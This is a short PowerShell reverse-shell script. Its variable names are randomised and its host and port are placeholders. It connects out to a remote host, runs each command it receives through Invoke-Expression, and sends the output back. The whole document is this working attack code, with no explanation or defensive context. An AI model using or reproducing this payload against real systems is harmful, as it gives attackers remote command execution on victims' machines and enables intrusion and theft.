$DXxkrwHgjd='<HOST>';$OPSqlJlDEg=<PORT>;
$AsDzYCyLzW=(New-Object Net.Sockets.TCPClient($DXxkrwHgjd,$OPSqlJlDEg)).GetStream();
[byte[]]$IqckfWMkEB=0..65535|%{0};
while(($eUyaStMAXH=$AsDzYCyLzW.Read($IqckfWMkEB,0,$IqckfWMkEB.Length)) -ne 0){;$kIwypYQIZs=(New-Object Text.ASCIIEncoding).GetString($IqckfWMkEB,0,$eUyaStMAXH);
$tmdFZtJnEQ=([text.encoding]::ASCII).GetBytes((iex $kIwypYQIZs 2>&1));
$AsDzYCyLzW.Write($tmdFZtJnEQ,0,$tmdFZtJnEQ.Length)}
